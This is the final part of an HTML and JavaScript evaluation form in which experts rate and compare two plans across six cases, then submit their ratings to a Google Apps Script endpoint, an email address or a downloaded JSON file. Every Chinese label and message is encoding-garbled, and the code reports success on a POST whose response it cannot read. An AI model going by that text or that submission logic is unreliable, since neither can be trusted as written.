                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(6)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(6)">å®Œæˆæäº¤ â†’</button>
    </div>
</div>

        
        <div class="export-section" id="exportSection">
            <h3>ğŸ‰ è¯„ä¼°å®Œæˆï¼</h3>
            <p>æ„Ÿè°¢æ‚¨çš„ä¸“ä¸šè¯„ä¼°ï¼Œç‚¹å‡»ä¸‹æ–¹æŒ‰é’®æäº¤æ•°æ®</p>
            <div class="export-buttons">
                <button class="btn btn-success" id="submitBtn" onclick="submitToCloud()">ï¿½ ä¸€é”®æäº¤æ•°æ®</button>
                <button class="btn btn-secondary" onclick="exportJSON()">ï¿½ å¤‡ç”¨ï¼šä¸‹è½½æ–‡ä»¶</button>
            </div>
            <div id="submitStatus" style="margin-top: 15px; padding: 15px; border-radius: 8px; display: none;"></div>
            <div class="data-preview" id="dataPreview"></div>
        </div>
    </div>
    
    <script>
        // å­˜å‚¨æ‰€æœ‰è¯„åˆ†æ•°æ®
        const evaluationData = {
            expert: {},
            cases: {}
        };
        
        const totalCases = 6;
        let completedCases = new Set();
        
        // åˆ‡æ¢æ¡ˆä¾‹é¢æ¿
        function switchCase(caseId) {
            document.querySelectorAll('.case-panel').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
            
            document.getElementById('case-' + caseId).classList.add('active');
            document.querySelector(`[data-case="${caseId}"]`).classList.add('active');
            
            saveCurrentData();
        }
        
        // ä¿å­˜å½“å‰æ•°æ®
        function saveCurrentData() {
            evaluationData.expert = {
                name: document.getElementById('expertName').value,
                role: document.getElementById('expertRole').value,
                date: document.getElementById('evalDate').value
            };
            
            // ä¿å­˜æ¯ä¸ªæ¡ˆä¾‹çš„è¯„åˆ†
            for (let i = 1; i <= totalCases; i++) {
                const caseData = {};
                const panel = document.getElementById('case-' + i);
                if (!panel) continue;
                
                // è·å–è¯„åˆ†ï¼ˆæ»‘å—æˆ–ä¸‹æ‹‰æ¡†ï¼‰
                ['planA', 'planB'].forEach(plan => {
                    caseData[plan] = {};
                    ['intent', 'evidence', 'playbook', 'safety'].forEach(dim => {
                        const input = panel.querySelector(`[name="${plan}_${dim}"]`);
                        if (input) caseData[plan][dim] = parseFloat(input.value) || 3;
                    });
                });
                
                // è·å–æ—¶é—´
                ['manualTime', 'reviewA', 'reviewB'].forEach(field => {
                    const input = panel.querySelector(`[name="${field}"]`);
                    if (input) caseData[field] = parseInt(input.value) || 0;
                });
                
                // è·å–åˆ¤æ–­
                const betterRadio = panel.querySelector('[name="better"]:checked');
                caseData.better = betterRadio ? betterRadio.value : '';
                
                const adoptARadio = panel.querySelector('[name="adoptA"]:checked');
                caseData.adoptA = adoptARadio ? adoptARadio.value : '';
                
                const adoptBRadio = panel.querySelector('[name="adoptB"]:checked');
                caseData.adoptB = adoptBRadio ? adoptBRadio.value : '';
                
                // è·å–è¯„ä»·
                const commentA = panel.querySelector('[name="commentA"]');
                const commentB = panel.querySelector('[name="commentB"]');
                caseData.commentA = commentA ? commentA.value : '';
                caseData.commentB = commentB ? commentB.value : '';
                
                evaluationData.cases['case_' + i] = caseData;
                
                // æ£€æŸ¥æ˜¯å¦å®Œæˆ
                const isComplete = caseData.planA.intent > 0 && caseData.planB.intent > 0 && caseData.better;
                if (isComplete) {
                    completedCases.add(i);
                    document.querySelector(`[data-case="${i}"]`).classList.add('completed');
                } else {
                    completedCases.delete(i);
                    document.querySelector(`[data-case="${i}"]`).classList.remove('completed');
                }
            }
            
            updateProgress();
            localStorage.setItem('expertEvaluation', JSON.stringify(evaluationData));
        }
        
        // æ›´æ–°è¿›åº¦
        function updateProgress() {
            const progress = (completedCases.size / totalCases) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('progressText').textContent = completedCases.size + '/' + totalCases;
            
            if (completedCases.size === totalCases) {
                document.getElementById('exportSection').classList.add('show');
            }
        }
        
        // ä¸‹ä¸€ä¸ªæ¡ˆä¾‹
        function nextCase(current) {
            saveCurrentData();
            if (current < totalCases) {
                switchCase(current + 1);
            } else {
                document.getElementById('exportSection').classList.add('show');
                document.getElementById('exportSection').scrollIntoView({ behavior: 'smooth' });
            }
        }
        
        // ä¸Šä¸€ä¸ªæ¡ˆä¾‹
        function prevCase(current) {
            saveCurrentData();
            if (current > 1) {
                switchCase(current - 1);
            }
        }
        
        // ========== äº‘ç«¯æäº¤é…ç½® ==========
        // Google Apps Script éƒ¨ç½²åœ°å€ï¼ˆæ•°æ®è‡ªåŠ¨ä¿å­˜åˆ° Google Sheetsï¼‰
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4LqA0DgXLwcWU-VDAMVcmBSjBruy_opmnlIjQUIRur0qni-KhamA4BJGNbg0bPEKR5Q/exec';
        
        // ä¸€é”®æäº¤åˆ°äº‘ç«¯ï¼ˆåƒé—®å·æ˜Ÿä¸€æ ·ï¼‰
        function submitToCloud() {
            saveCurrentData();
            
            // éªŒè¯å¿…å¡«é¡¹
            if (!evaluationData.expert.name) {
                alert('âš ï¸ è¯·å¡«å†™ä¸“å®¶å§“å');
                return;
            }
            
            const submitBtn = document.getElementById('submitBtn');
            const statusDiv = document.getElementById('submitStatus');
            
            // æ˜¾ç¤ºæäº¤ä¸­çŠ¶æ€
            submitBtn.disabled = true;
            submitBtn.textContent = 'â³ æäº¤ä¸­...';
            statusDiv.style.display = 'block';
            statusDiv.style.background = '#fef3c7';
            statusDiv.style.color = '#92400e';
            statusDiv.innerHTML = 'æ­£åœ¨æäº¤æ•°æ®ï¼Œè¯·ç¨å€™...';
            
            // å‡†å¤‡æäº¤æ•°æ®
            const submitData = {
                submitTime: new Date().toISOString(),
                expert: evaluationData.expert,
                cases: evaluationData.cases
            };
            
            // å¦‚æœé…ç½®äº† Google Script URLï¼Œåˆ™æäº¤åˆ°äº‘ç«¯
            if (GOOGLE_SCRIPT_URL && GOOGLE_SCRIPT_URL !== 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
                fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submitData)
                }).then(() => {
                    // no-cors æ¨¡å¼æ— æ³•è·å–å“åº”ï¼Œå‡è®¾æˆåŠŸ
                    showSuccess();
                }).catch(error => {
                    console.error('æäº¤å¤±è´¥:', error);
                    showError();
                });
            } else {
                // æœªé…ç½®äº‘ç«¯ï¼Œä½¿ç”¨é‚®ä»¶æ–¹å¼
                submitViaEmail(submitData);
            }
        }
        
        // é‚®ä»¶æäº¤æ–¹å¼
        function submitViaEmail(data) {
            const subject = `ä¸“å®¶è¯„ä¼°æ•°æ®_${data.expert.name}_${new Date().toISOString().split('T')[0]}`;
            const body = `ä¸“å®¶ï¼š${data.expert.name}\nèŒä½ï¼š${data.expert.role}\n\nè¯„ä¼°æ•°æ®ï¼š\n${JSON.stringify(data, null, 2)}`;
            const mailtoLink = `mailto:2558293069@qq.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
            
            window.location.href = mailtoLink;
            
            setTimeout(() => {
                const statusDiv = document.getElementById('submitStatus');
                statusDiv.style.display = 'block';
                statusDiv.style.background = '#dbeafe';
                statusDiv.style.color = '#1e40af';
                statusDiv.innerHTML = 'ğŸ“§ é‚®ä»¶å·²æ‰“å¼€ï¼è¯·ç‚¹å‡»å‘é€å®Œæˆæäº¤ã€‚<br>å¦‚é‚®ä»¶æœªæ‰“å¼€ï¼Œè¯·ç‚¹å‡»"å¤‡ç”¨ï¼šä¸‹è½½æ–‡ä»¶"ã€‚';
                
                document.getElementById('submitBtn').disabled = false;
                document.getElementById('submitBtn').textContent = 'ğŸš€ ä¸€é”®æäº¤æ•°æ®';
            }, 1000);
        }
        
        // æ˜¾ç¤ºæˆåŠŸçŠ¶æ€
        function showSuccess() {
            const statusDiv = document.getElementById('submitStatus');
            const submitBtn = document.getElementById('submitBtn');
            
            statusDiv.style.display = 'block';
            statusDiv.style.background = '#d1fae5';
            statusDiv.style.color = '#065f46';
            statusDiv.innerHTML = 'âœ… <strong>æäº¤æˆåŠŸï¼</strong><br>æ„Ÿè°¢æ‚¨çš„è¯„ä¼°ï¼Œæ•°æ®å·²è‡ªåŠ¨ä¿å­˜ã€‚æ‚¨å¯ä»¥å…³é—­æ­¤é¡µé¢ã€‚';
            
            submitBtn.textContent = 'âœ… å·²æäº¤';
            submitBtn.style.background = '#10b981';
            
            // æ¸…é™¤æœ¬åœ°å­˜å‚¨
            localStorage.removeItem('expertEvaluation');
        }
        
        // æ˜¾ç¤ºå¤±è´¥çŠ¶æ€
        function showError() {
            const statusDiv = document.getElementById('submitStatus');
            const submitBtn = document.getElementById('submitBtn');
            
            statusDiv.style.display = 'block';
            statusDiv.style.background = '#fee2e2';
            statusDiv.style.color = '#991b1b';
            statusDiv.innerHTML = 'âŒ æäº¤å¤±è´¥ï¼Œè¯·ä½¿ç”¨"å¤‡ç”¨ï¼šä¸‹è½½æ–‡ä»¶"æ–¹å¼ï¼Œæˆ–ç¨åé‡è¯•ã€‚';
            
            submitBtn.disabled = false;
            submitBtn.textContent = 'ğŸš€ é‡æ–°æäº¤';
        }
        
        // å¯¼å‡º JSONï¼ˆå¤‡ç”¨æ–¹å¼ï¼‰
        function exportJSON() {
            saveCurrentData();
            const dataStr = JSON.stringify(evaluationData, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `ä¸“å®¶è¯„ä¼°_${evaluationData.expert.name || 'unknown'}_${new Date().toISOString().slice(0,10)}.json`;
            a.click();
            
            document.getElementById('dataPreview').textContent = dataStr;
            
            alert('âœ… æ–‡ä»¶å·²ä¸‹è½½ï¼è¯·å°†æ­¤æ–‡ä»¶å‘é€ç»™ç ”ç©¶äººå‘˜ã€‚');
        }
        
        // å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼ˆå¤‡ç”¨æ–¹å¼ï¼‰
        function copyToClipboard() {
            saveCurrentData();
            const dataStr = JSON.stringify(evaluationData, null, 2);
            navigator.clipboard.writeText(dataStr).then(() => {
                alert('âœ… æ•°æ®å·²å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼');
            });
            document.getElementById('dataPreview').textContent = dataStr;
        }
        
        // æ¢å¤ä¿å­˜çš„æ•°æ®
        function restoreData() {
            const saved = localStorage.getItem('expertEvaluation');
            if (saved) {
                try {
                    const data = JSON.parse(saved);
                    if (data.expert) {
                        document.getElementById('expertName').value = data.expert.name || '';
                        document.getElementById('expertRole').value = data.expert.role || '';
                        if (data.expert.date) document.getElementById('evalDate').value = data.expert.date;
                    }
                    // TODO: æ¢å¤æ¡ˆä¾‹è¯„åˆ†
                } catch(e) {}
            }
        }
        
        // åˆå§‹åŒ–
        document.addEventListener('DOMContentLoaded', () => {
            restoreData();
            switchCase(1);
            
            // è‡ªåŠ¨ä¿å­˜
            document.querySelectorAll('input, select, textarea').forEach(el => {
                el.addEventListener('change', saveCurrentData);
            });
        });
    </script>
</body>
</html>
